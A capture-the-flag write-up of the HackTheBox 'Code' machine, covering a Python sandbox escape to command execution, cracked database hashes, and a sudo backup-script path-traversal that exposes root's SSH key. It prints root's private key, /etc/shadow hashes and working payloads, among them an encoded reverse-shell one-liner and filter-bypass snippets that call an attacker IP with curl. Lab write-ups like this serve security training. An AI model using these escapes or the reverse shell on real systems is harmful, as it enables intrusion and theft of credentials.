---
render_with_liquid: false
title: HackTheBox Writeup - Code
date: 2025-03-26 14:11:37 +1400
tags: [hackthebox, nmap, linux, python, python-flask, python-jail-escape, python-sqlalchemy, crackstation, credentials-stuffing, sudo, bash-script, backy, logic-flaw, directory-traversal, file-read]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/55cc3528cd7ad96f67c4f0c715efe286.png
    width: 640
    height: 480
---



Code is an easy Linux machine featuring a Python Code Editor web application that is vulnerable to remote code execution by achieving a Python Jail Bypass. After gaining access as the `app-production` user, crackable credentials can be found in an `sqlite3` database file. Using these credentials, access is granted to another user, `martin`, who has `sudo` permissions to a backup utility script, `backy.sh`. This script includes a section of vulnerable code, which, when exploited, allows us to escalate our privileges by creating a copy of the `root` folder.

# Recon
---

## Nmap

```bash
# Nmap 7.95 scan initiated Wed Mar 26 14:11:36 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,5000, 10.129.226.149
Nmap scan report for 10.129.226.149
Host is up, received user-set (0.20s latency).
Scanned at 2025-03-26 14:11:37 CST for 15s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 26 14:11:52 2025 -- 1 IP address (1 host up) scanned in 16.14 seconds
```


## 80 - HTTP : Python Code Editor


### Info

```ruby
http://10.129.226.149:5000 [200] [Python Code Editor] [gunicorn/20.0.4] [ef430b51078fca111285f14f4b3e7beccc52da2b] [Cloudflare,Python,cdnjs,gunicorn:20.0.4,jQuery]
```

![](/assets/obsidian/dd498befd9535895ec79dd112996ea48.png)

### Directory

```bash
[+] cat httpx/urls.txt | feroxbuster -k -A --stdin -w /usr/share/wordlists/dirb/common.txt --dont-scan .(tif|tiff|ico|cur|bmp|webp|svg|png|jpg|jpeg|jfif|gif|avif|apngogg|css|js|woff|woff2|eot|ttf|otf)$ -I css,png,jpg,gif --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 404,400,500 -r -n --scan-limit 4 -o bulkdirb.txt
```

```bash
405      GET        5l       20w      153c http://10.129.226.149:5000/run_code
405      GET        5l       20w      153c http://10.129.226.149:5000/save_code
200      GET       24l       53w      741c http://10.129.226.149:5000/register
200      GET       24l       53w      730c http://10.129.226.149:5000/login
200      GET      100l      234w     3435c http://10.129.226.149:5000/
200      GET       22l       96w      818c http://10.129.226.149:5000/about
```


# User Flag
---

## Shell as martin


### 5000 - Python Code Editor : Python jail escape

> http://10.10.11.62:5000/

It's a python sandbox for users to run python code, but some words like `system` or `import` are banned

```python
import os; os.system("id")
```

![](/assets/obsidian/e0417dfc4bdb77de5bdd2b425eefeec8.png)

![](/assets/obsidian/8f19b04b896b9b94bde759aafdeb34cc.png)

![](/assets/obsidian/3850c062a89472392ab20e697610bdae.png)

Tried some common methods to bypass **python jail**, they all resulted with the error : `Use of restricted keywords is not allowed.`

```python
# Banned : open, read
with open ("/etc/passwd") as f: print(f.read())

# Banned : exec
exec(')"imaohw"(metsys.so ;so tropmi'[::-1])

# Banned : eval
eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
```

> However, we can still bypass the filters by splitting strings, then access functions such as `popen` to run commands. Check out [[#Additional#Python jail escape to RCE]]
{: .prompt-info }

By enumerating **global** variables, we got some useful information

```python
print(globals())
```

- Web framework : `Flask`
- Web app file location : `/home/app-production/app/app.py`
- Database engine : `SQLAlchemy` and the database file location : `sqlite:////home/app-production/app/instance/database.db`
- A `User` class exists in `app.py`
- Custom objects and functions

![](/assets/obsidian/249bda3ac57a3a1894c810a6f223d93a.png)

![](/assets/obsidian/2a8c4bde02cfa73d657276734818e047.png)

> **SQLAlchemy** is a Python SQL toolkit and Object Relational Mapper that gives application developers the full power and flexibility of SQL
{: .prompt-info }

The `User` class is a **sqlalchemy** model

```python
print(type(User))
```

![](/assets/obsidian/d43fb4b40bf3b67b5b7b52f619a92c76.png)

Enumerate `User` class's attributes and functions

```python
print(dir(User))
```

![](/assets/obsidian/da28056726f7576eb333de00908c3529.png)

Query all user data by running **sqlalchemy** model's built-in function

```python
print(User.query.all())
```

![](/assets/obsidian/50a14339afb6f9e33365b21ac2c923e5.png)

To show variables of user instances, we can iterate through the list of users with `vars()`

```python
print([vars(x) for x in User.query.all()])
```

- Found some **MD5** password hashes

![](/assets/obsidian/8ed19efd1009fef8ea977c053b387753.png)

We can upload the **MD5** password hashes to [crackstation](https://crackstation.net/) to make use of on online **rainbow table**

```
759b74ce43947f5f4c91aeddc3e5bad3
3de6f30c4a09c27fc71932bfc68474be
```

![](/assets/obsidian/ca25887fbc5c664950fbb5e615285150.png)


### 22 - SSH : Credential stuffing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Code]
└─$ cssh $(pt get rhost) martin 'nafeelswordsmaster'
Warning: Permanently added '10.129.226.149' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 26 Mar 2025 08:02:57 AM UTC

  System load:           0.08
  Usage of /:            55.2% of 5.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.226.149
  IPv6 address for eth0: dead:beef::250:56ff:feb0:c87b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Mar 26 08:02:58 2025 from 10.10.14.7
martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
```


# Root Flag
---

## From martin to root


### SUDO - Bash script : Logic flaw leads to arbitrary file read

`martin` can run `/usr/bin/backy.sh` as `root`

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

`/usr/bin/backy.sh` is owned by `root`

```bash
martin@code:~$ ls -la /usr/bin/backy.sh
-rwxr-xr-x 1 root root 926 Sep 16  2024 /usr/bin/backy.sh
```

> **Code overview**
> 
> The bash script grabs `directories_to_archive` from user provided `json` file, then check if the directories in `.directories_to_archive` array start with `/var` or `/home`, if true, it will run **backy** with the `json` file specified
> - `updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")` : It removes `../` from `directories_to_archive` then store the result in `$updated_json` to prevent directory traversal
{: .prompt-tip }

```bash
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

There's a `backup` folder with `task.json` and an archive that probably contains `/home/app-production/app`

```bash
martin@code:~$ ls -latr
total 36
drwxr-xr-x 4 root   root   4096 Aug 27  2024 ..
-rw-r--r-- 1 martin martin  807 Aug 27  2024 .profile
-rw-r--r-- 1 martin martin  220 Aug 27  2024 .bash_logout
-rw-r--r-- 1 martin martin 3771 Aug 27  2024 .bashrc
lrwxrwxrwx 1 root   root      9 Aug 27  2024 .bash_history -> /dev/null
lrwxrwxrwx 1 root   root      9 Aug 27  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root   root      9 Aug 27  2024 .sqlite_history -> /dev/null
drwx------ 2 martin martin 4096 Sep 16  2024 .ssh
drwxrwxr-x 2 martin martin 4096 Feb 17 10:58 .local
drwx------ 2 martin martin 4096 Mar 26 08:05 .cache
drwxr-x--- 6 martin martin 4096 Mar 26 08:55 .
drwxr-xr-x 2 martin martin 4096 Mar 26 08:55 backups
martin@code:~$ ls -latr backups/
total 20
-rw-r--r-- 1 martin martin  181 Mar 26 08:55 task.json
-rw-r--r-- 1 martin martin 5879 Mar 26 08:55 code_home_app-production_app_2024_August.tar.bz2
drwxr-x--- 6 martin martin 4096 Mar 26 08:55 ..
drwxr-xr-x 2 martin martin 4096 Mar 26 08:55 .
```

`backups/task.json` is an example that `/usr/bin/backy` recognizes

```bash
martin@code:~$ cat backups/task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],
        "exclude": [
                ".*"
        ]
}
```

Create a custom `task.json` based on the template to achieve the goals: 

- directory traversal from `/home/` to `/root/.ssh`
- set `verbose_log` to true
- remove `exclude` key

```bash
martin@code:~$ vi /tmp/task.json
```

```json
{
  "destination": "/tmp/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/../root/.ssh"
  ]
}
```

Run `/usr/bin/backy.sh` as `root` with the custom `task.json`, for some reasons it doesn't remove `../` from `.directories_to_archive`

```bash
martin@code:~$ sudo /usr/bin/backy.sh /tmp/task.json
/usr/bin/backy.sh: line 19: /tmp/task.json: Permission denied
2025/03/26 18:59:50 🍀 backy 1.2
2025/03/26 18:59:50 📋 Working with /tmp/task.json ...
2025/03/26 18:59:50 💤 Nothing to sync
2025/03/26 18:59:50 📤 Archiving: [/home/../root/.ssh]
2025/03/26 18:59:50 📥 To: /tmp ...
2025/03/26 18:59:50 📦
tar: Removing leading `/home/../' from member names
/home/../root/.ssh/
/home/../root/.ssh/id_rsa
/home/../root/.ssh/authorized_keys
```

Decompress the backup archive

```bash
martin@code:~$ tar jxvf /tmp/code_home_.._root_.ssh_2025_March.tar.bz2
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
```

Read ssh private key

```bash
martin@code:~$ cat root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
hdENGN+hVCh//jFwAAAAlyb290QGNvZGU=
-----END OPENSSH PRIVATE KEY-----
martin@code:~$ rm -rf root/
martin@code:~$ 
```

Save the ssh private key to local then set proper permissions

```bash
┌──(bravosec㉿fsociety)-[~/htb/Code]
└─$ vi loot/root.id_rsa                                                                                                                                                                                   
┌──(bravosec㉿fsociety)-[~/htb/Code]
└─$ chmod 600 loot/root.id_rsa
```

SSH with the private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Code]
└─$ ssh -i loot/root.id_rsa root@$(pt get rhost)
Warning: Permanently added '10.10.11.62' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 26 Mar 2025 06:47:14 PM UTC

  System load:           0.13
  Usage of /:            51.4% of 5.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             243
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:feb9:191d


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar 26 18:47:14 2025 from 10.10.14.144
root@code:~# id
uid=0(root) gid=0(root) groups=0(root)
root@code:~# cat root.txt
e948a8028cbd58e7c890431e9d7c9970
root@code:~# cat /home/app-production/user.txt
7f535a5b3a3db577c45a1bf07a302ccf
```

# Additional
---

## Post exploitation


### Secrets

```bash
root@code:~# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$6$UHZYd6beZ0z/jb9q$9dEz/1pi4fnVirs9VuURIvU0X/PO321dFctbLr3EBeeii31EZ7OjetlzaiHMZa5HC6jJEN5FWLva/oisCnc4D1:19931:0:99999:7:::
app-production:$6$HjHAfjyM/2n2iItl$.So3HPNRtfPFQlcRvRPYpVzro48elIVza8GdeOVIzd47zJLP7QibwcVh8NIUxttofJiBGS1b36tiVuNoaEyMU0:19931:0:99999:7:::
martin:$6$wSHwZeJrAIh31tGN$1aAHjOgCNDWuEOpzMydwUp4GbiguXz02L8i8YBC.yd7YQ4BZbOr/VMBjzzjTdMVoAnr37omZ/HJXMy.JBIfZ3.:19962:0:99999:7:::
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```


## Python jail escape to RCE


### Access all loaded classes

We can use a trick to view all classes loaded in memory:

```python
print(().__class__.__base__.__subclasses__())
```

- `()` : Empty tuple
- `().__class__` : Gets the class of the empty tuple (`<class 'tuple'>`)
- `().__class__.__base__` : Gets the **base class** of `tuple` (`<class 'object'>`)
- `().__class__.__base__.__subclasses__()` : Calls the `__subclasses__()` method of `object`, which returns a **list of all classes that directly inherit from `object`**

![](/assets/obsidian/87a40f76f6c744dfa2ff58eea2b7303e.png)


### Popen

We can iterate through all classes and find the imported `subprocess.Popen` class by splitting `'popen'` to `'po'+'pen'`, then use it to execute command

```python
for cls in ().__class__.__base__.__subclasses__():
    if "po"+"pen"==cls.__name__.lower():
        print(f"{cls.__module__}.{cls.__name__}")
        powpen = cls
        powpen(['curl','10.10.14.63'])
        break
```

![](/assets/obsidian/c3268f62e5b17f200916ce80cfa69f01.png)

Got a callback, which indicates that it worked

![](/assets/obsidian/ba4442d055712fb245cfbf612fc5acac.png)

Below is a oneliner to get reverse shell using list comprehension:

```python
[x for x in ().__class__.__base__.__subclasses__() if x.__name__.lower()=='pop'+'en'][0](['/bin/bash', '-c', 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42My8xMTExIDA+JjEK | base64 -d | bash'])
```

![](/assets/obsidian/b862a1925c7eaba3add3f1d8b97a69c0.png)


### Other methods - Call os.system


#### Method 1

We can iterate through all classes and find one that has `sys.modules` in global namespace, then use it to access `os.system()`

Original:

```python
for cls in ().__class__.__base__.__subclasses__():
    init_fn = cls.__init__
    if hasattr(init_fn, '__globals__'):
        globs = init_fn.__globals__
        if 'sys' in globs:
            print(f"{cls.__module__}.{cls.__name__}")
            sys_mod = globs['sys']
            mod = sys_mod.modules['o'+'s']
            func = 'sy' + 'st' + 'em'
            swistem = getattr(mod, func)
            swistem('curl 10.10.14.63')
            break
```

![](/assets/obsidian/39b6c3570f8792c76827c312e5d855e3.png)

Simplified:

```python
getattr([c.__init__.__globals__['sys'] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__, '__globals__') and 'sys' in c.__init__.__globals__][0].modules['o'+'s'], 'sys'+'tem')('curl 10.10.14.63')
```

Or find a class that uses `os`:

```python
[x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'o"+"s." in str(x)][0]['sys'+'tem']('curl 10.10.14.63')
```

![](/assets/obsidian/c0ad22b2c05713ae072e755a8b22c496.png)


#### Method 2

Since we already know that `catch_warnings` has `sys` module in its global namespace, just use it instead of searching from all classes

Original : 

```python
sys_mod = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0].__init__.__globals__["sys"]
o = sys_mod.modules["o"+"s"]
func_name = 'sys' + 'tem'
swistem = getattr(o, func_name)
print(swistem("curl 10.10.14.63"))
```

Simplified:

```python
getattr([x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0].__init__.__globals__["sys"].modules["o"+"s"], 'sys'+'tem')("curl 10.10.14.63")
```


#### Method 3

Access `os.system()` from `sys.modules` in current global namespace

Original:

```python
sys_mod = globals()['sys']
so_mod = sys_mod.modules['o'+'s']
swistem = getattr(so_mod, 'sys'+'tem')
print(swistem('curl 10.10.14.63'))
```

Simplified :

```python
getattr(globals()['sys'].modules['o'+'s'], 'sys'+'tem')('curl 10.10.14.63')
```